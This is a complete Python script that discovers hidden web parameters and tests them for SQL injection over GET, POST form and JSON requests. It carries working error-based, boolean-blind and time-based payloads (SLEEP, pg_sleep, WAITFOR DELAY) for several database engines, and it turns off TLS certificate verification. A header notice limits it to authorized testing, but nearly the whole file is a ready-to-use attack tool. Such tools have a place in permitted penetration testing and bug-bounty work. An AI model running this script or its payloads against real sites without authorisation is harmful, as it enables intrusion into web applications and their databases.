#!/usr/bin/env python3
"""sqli.py — discover parameters, then test them for SQL injection.

Authorized testing only: your own apps, in-scope bug-bounty targets, or engagements
with written permission. You are responsible for how you use it.

usage:
  ./sqli.py "https://site/item?id=1"                 # test the params already on the URL
  ./sqli.py "https://site/item" --discover           # mine hidden params (GET), then test them
  ./sqli.py "https://site/api" -m json --discover     # JSON body API
  ./sqli.py "https://site/login" -d "user=a&pass=b"  # POST form, test given params
"""
import sys, re, time, json, random, string, argparse, os
import urllib.parse as up, urllib.request as ur, ssl

# ---- SQLi signatures / payloads -------------------------------------------------
ERRORS = re.compile(r"|".join([
    r"SQL syntax.*MySQL", r"MySQLSyntaxError", r"valid MySQL result", r"check the manual that corresponds to your (MySQL|MariaDB)",
    r"PostgreSQL.*ERROR", r"pg_query\(\)", r"PG::SyntaxError",
    r"Microsoft SQL (Server|Native)", r"ODBC SQL Server Driver", r"Unclosed quotation mark",
    r"SQLite/JDBCDriver", r"SQLite\.Exception", r"sqlite3.OperationalError", r"unrecognized token",
    r"ORA-\d{5}", r"Oracle error",
]), re.I)
PAIRS = [("' AND '1'='1", "' AND '1'='2"), ('" AND "1"="1', '" AND "1"="2'), (" AND 1=1", " AND 1=2")]
TIME = [
    "' AND SLEEP({s})-- -", '" AND SLEEP({s})-- -', " AND SLEEP({s})-- -",
    "'; SELECT pg_sleep({s})-- -", " AND (SELECT {n} FROM pg_sleep({s}))-- -",
    "'; WAITFOR DELAY '0:0:{s}'-- -", " WAITFOR DELAY '0:0:{s}'-- -",
]
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE


def rand(n=8):
    return "zqx" + "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def fetch(url, data=None, ctype=None, timeout=20):
    """Return (status, body, seconds). data=bytes -> POST. Network errors -> (0, '', elapsed)."""
    headers = {"User-Agent": "sqli.py"}
    if ctype:
        headers["Content-Type"] = ctype
    req = ur.Request(url, data=data, headers=headers)
    t = time.monotonic()
    try:
        with ur.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.getcode(), r.read().decode("utf-8", "replace"), time.monotonic() - t
    except ur.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), time.monotonic() - t
    except Exception:
        return 0, "", time.monotonic() - t


def make_sender(target, method, delay):
    """Return send(params)->(status,body,seconds), encoding per transport, baseline params merged in."""
    def send(params):
        if delay:
            time.sleep(delay)
        if method == "get":
            return fetch(target + ("&" if up.urlsplit(target).query else "?") + up.urlencode(params))
        if method == "json":
            return fetch(target, json.dumps(params).encode(), "application/json")
        return fetch(target, up.urlencode(params).encode(), "application/x-www-form-urlencoded")
    return send


# ---- parameter discovery (reflection + stable-factor behavioral diff + bisection) ----
def discover(send, base, names, chunk=20, verbose=False):
    """Find which candidate names the app actually reacts to. Returns {name: 'reflected'|'behavioral'}."""
    def factors(status, body):
        return (status, len(body), len(body.split()), body.count("\n"))

    prof = [factors(*send(base)[:2]) for _ in range(4)]          # learn baseline noise
    base_f = prof[0]
    stable = [i for i in range(4) if len({f[i] for f in prof}) == 1]  # factors that don't vary on their own
    if verbose:
        labels = ["status", "length", "words", "lines"]
        print(f"[*] stable baseline factors: {', '.join(labels[i] for i in stable) or 'NONE (reflection-only)'}")

    def reacts(status, body, canaries):
        if any(c in body for c in canaries):
            return True
        f = factors(status, body)
        return any(f[i] != base_f[i] for i in stable)

    found = {}

    def scan(subset):
        cans = {n: rand() for n in subset}
        status, body, _ = send({**base, **cans})
        reflected = [n for n, c in cans.items() if c in body]     # reflected params identified directly
        for n in reflected:
            found[n] = "reflected"
        rest = [n for n in subset if n not in reflected]
        if not rest or not reacts(status, body, {cans[n] for n in rest}):
            return
        if len(rest) == 1:
            found[rest[0]] = "behavioral"
            return
        mid = len(rest) // 2                                       # bisect to isolate the reacting name
        scan(rest[:mid]); scan(rest[mid:])

    for i in range(0, len(names), chunk):
        scan(names[i:i + chunk])

    confirmed = {}                                                # re-test each alone to drop false positives
    for n, how in found.items():
        c = rand()
        status, body, _ = send({**base, n: c})
        if (c in body) if how == "reflected" else reacts(status, body, {c}):
            confirmed[n] = how
    return confirmed


# ---- SQLi tests -----------------------------------------------------------------
def mutate(params, key, value):
    p = dict(params); p[key] = value; return p


def test_param(send, params, key):
    orig = params.get(key, "1")
    base_status, base_body, _ = send(params)

    for probe in ("'", '"', "')"):
        _, body, _ = send(mutate(params, key, orig + probe))
        if ERRORS.search(body) and not ERRORS.search(base_body):
            yield f"error-based  ({probe!r} triggers DBMS error)"; break

    for t_pl, f_pl in PAIRS:
        _, bt, _ = send(mutate(params, key, orig + t_pl))
        _, bf, _ = send(mutate(params, key, orig + f_pl))
        if bt and len(bt) != len(bf) and abs(len(bt) - len(base_body)) < abs(len(bf) - len(base_body)):
            yield f"boolean-blind ({t_pl!r} vs {f_pl!r}: {len(bt)} vs {len(bf)} bytes)"; break

    DELAY = 5
    for tpl in TIME:
        _, _, dt = send(mutate(params, key, orig + tpl.format(s=DELAY, n=1)))
        if dt >= DELAY - 1:
            _, _, dt2 = send(mutate(params, key, orig + tpl.format(s=DELAY, n=1)))
            if dt2 >= DELAY - 1:
                yield f"time-blind   ({tpl.split(chr(39))[0] or tpl[:20]!r}: {dt:.1f}s/{dt2:.1f}s)"; break


def main():
    ap = argparse.ArgumentParser(description="SQL injection discovery + tester (authorized use only)")
    ap.add_argument("url", help="target URL; include query params for GET testing")
    ap.add_argument("-d", "--data", help="POST form data, e.g. 'user=a&pass=b' (implies -m post)")
    ap.add_argument("-m", "--method", choices=["get", "post", "json"], help="transport (default: get, or post with -d)")
    ap.add_argument("--discover", action="store_true", help="mine hidden params from the wordlist before testing")
    ap.add_argument("-w", "--wordlist", help="param-name wordlist for --discover (default: params.txt beside script)")
    ap.add_argument("--delay", type=float, default=0, help="seconds between requests (rate-limit / WAF friendliness)")
    ap.add_argument("-v", "--verbose", action="store_true")
    a = ap.parse_args()

    method = a.method or ("post" if a.data else "get")
    u = up.urlsplit(a.url)
    if a.data:
        params = dict(up.parse_qsl(a.data, keep_blank_values=True)); target = a.url
    elif method == "get":
        params = dict(up.parse_qsl(u.query, keep_blank_values=True))
        target = up.urlunsplit((u.scheme, u.netloc, u.path, u.query, ""))  # keep existing query for discovery base
        if not a.discover:
            target = up.urlunsplit((u.scheme, u.netloc, u.path, "", ""))   # testing rebuilds query itself
    else:
        params = {}; target = a.url

    send = make_sender(target, method, a.delay)

    if a.discover:
        wl = a.wordlist or os.path.join(os.path.dirname(os.path.abspath(__file__)), "params.txt")
        names = [n.strip() for n in open(wl) if n.strip() and not n.startswith("#")]
        names = [n for n in names if n not in params]
        print(f"[*] discovering params: {len(names)} candidates via {method.upper()} ...")
        hits = discover(send, dict(params), names, verbose=a.verbose)
        for n, how in hits.items():
            print(f"    [+] {n}  ({how})")
        print(f"[*] discovered {len(hits)} param(s)\n")
        for n in hits:
            params.setdefault(n, "1")

    if not params:
        sys.exit("no parameters to test — add ?a=1, pass -d 'a=1', or use --discover")

    print(f"[*] testing {len(params)} param(s) via {method.upper()}: {', '.join(params)}\n")
    total = 0
    for key in list(params):
        print(f"[>] {key}")
        for f in test_param(send, params, key):
            print(f"    [!] {f}"); total += 1
    print(f"\n[*] done — {total} finding(s)")


if __name__ == "__main__":
    main()
